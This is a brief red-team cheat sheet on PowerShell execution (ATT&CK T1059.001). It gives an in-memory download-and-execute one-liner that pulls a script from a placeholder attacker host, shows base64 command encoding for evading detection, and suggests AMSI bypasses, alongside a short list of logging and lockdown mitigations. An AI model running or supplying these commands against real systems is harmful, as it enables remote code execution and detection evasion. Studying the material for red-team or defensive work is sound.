# PowerShell Execution (T1059.001)

## Overview
PowerShell is a powerful scripting language and shell that is widely used by administrators. Red teams use it for execution, discovery, and post-exploitation.

## Common One-Liners

### Download and Execute (In-Memory)
```powershell
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### Base64 Encoded Command
Avoids simple string-based detection.
```bash
echo "Write-Host 'Hello from PowerShell'" | iconv -t utf16le | base64 -w0
# Output: VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAZgByAG8AbQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAJwAK
powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAZgByAG8AbQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAJwAK
```

## OPSEC Considerations
* **Script Block Logging (Event ID 4104):** Records the full content of scripts.
* **AMSI (Antimalware Scan Interface):** Scans scripts before execution. Use AMSI bypasses if necessary.
* **Constrained Language Mode (CLM):** Limits the functionality of PowerShell.

## Mitigations
* Enable Constrained Language Mode via AppLocker or Device Guard.
* Monitor Event IDs 4104 (Script Block Logging) and 4103 (Module Logging).
* Disable PowerShell v2 to prevent version downgrade attacks.
